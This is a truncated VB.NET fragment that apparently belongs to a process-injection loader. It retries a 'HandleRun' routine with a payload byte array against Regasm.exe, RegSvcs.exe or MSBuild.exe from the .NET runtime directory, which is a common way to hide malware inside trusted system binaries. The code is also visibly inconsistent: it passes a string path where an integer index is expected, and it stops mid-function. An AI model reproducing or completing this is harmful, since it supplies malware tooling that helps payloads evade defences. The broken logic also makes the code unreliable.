...
Class Main
    ...
    Public Shared Function Run(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        For I As Integer = 1 To 5
            If HandleRun(Path_(path), cmd, data, compatible) Then Return True
        Next

        Return False
    End Function

    Private Shared Function Path_(ByVal i As Integer) As String
        Try
            Select Case i
                Case 0
                    Return IO.Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "Regasm.exe")
                Case 1
                    Return IO.Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegSvcs.exe")
                Case 2
                    Return IO.Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "MSBuild.exe")
            End Select
